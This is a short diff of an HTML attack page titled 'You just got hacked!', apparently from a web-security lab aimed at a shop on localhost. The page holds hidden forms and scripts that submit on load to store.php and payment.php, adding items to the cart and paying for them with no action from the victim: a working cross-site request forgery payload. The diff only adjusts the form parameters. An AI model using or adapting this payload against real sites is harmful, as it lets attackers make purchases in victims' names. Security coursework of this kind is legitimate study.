@@ -6,13 +6,14 @@
     <h1 align="center" > You just got hacked!</h1>
     <!-- create form which increases item with id=1 by 1000 units -->
     <form id=add method="post" action="https://localhost/store.php" target="xss1">
-      <input type="hidden" name="itemIds" value=1>
-      <input type="hidden" name="quantity" value=1000>
+      <input type="hidden" name="add" value=1>
+      <input type="hidden" name="itemIds[2]" value=100>
     </form>
     <!--submits the form to store.php -->
     <script> document.getElementById("add").submit() </script>
     <!-- go to payment.php -->
     <form id="buy" style="display:none" method="post" action="https://localhost/payment.php" target="xss2">
+      <input type="hidden" name="pay" value=1>
     </form>
     <!--submits the form to payment.php -->
     <script> document.getElementById("buy").submit() </script>
